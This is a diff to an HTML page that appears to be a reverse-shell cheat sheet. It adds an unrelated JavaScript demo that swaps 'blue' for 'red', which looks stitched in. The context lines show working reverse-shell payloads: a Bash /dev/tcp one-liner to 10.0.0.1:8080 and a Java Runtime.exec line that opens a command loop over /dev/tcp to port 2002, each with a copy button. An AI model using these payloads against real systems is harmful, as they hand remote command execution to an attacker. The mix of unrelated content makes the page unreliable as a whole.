@@ -135,6 +135,22 @@
 					</div>
 
 					<p> </p>
+
+
+<p>Click the button to replace "blue" with "red" in the paragraph below:</p>
+
+<p id="demo">Mr Blue has a blue house and a blue car.</p>
+
+<button onclick="myFunction()">Try it</button>
+
+<script>
+function myFunction() {
+  var str = document.getElementById("demo").innerHTML; 
+  var res = str.replace(/blue/g, "red");
+  document.getElementById("demo").innerHTML = res;
+}
+</script>
+
 <h2 id="bash">Bash</h2>
 <p> </p>
 <div id="to-copy-bash" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
@@ -177,6 +193,7 @@
 p <span style="color:#f92672">=</span> r.exec<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">]</span> as String<span style="color:#f92672">[])</span>
 p.waitFor<span style="color:#f92672">()</span></code></pre></div>
 <button onClick="CopyToClipboard('to-copy-java')">Copy</button>
+<p> </p>
 				</div>
 			</div>
 			<div class="col-sm-1 col-md-3 col-md-4">
